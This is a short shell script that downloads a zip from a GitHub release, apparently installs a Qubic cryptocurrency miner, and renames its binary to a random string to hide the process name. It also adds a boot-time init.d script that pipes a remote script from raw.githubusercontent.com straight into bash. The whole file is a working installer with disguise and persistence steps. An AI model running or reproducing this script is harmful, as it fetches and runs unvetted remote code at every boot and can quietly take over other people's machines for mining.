cd /
wget https://github.com/hutsaza/spade/releases/download/v1.9.7/shard.zip
unzip shard.zip
cd /shard
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv bronz $variable1
sed -i "s/python/${variable1}/g" ./huts.sh
sed -i "s/ALIAS/${variable1}/g" ./qubicmine.json
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/hutsaza/spade/main/maps.sh)" > strata.sh
chmod a+x strata.sh
update-rc.d strata.sh defaults
rm -rf shard.zip
cd /shard
nohup ./huts.sh
ps -ef | grep shard
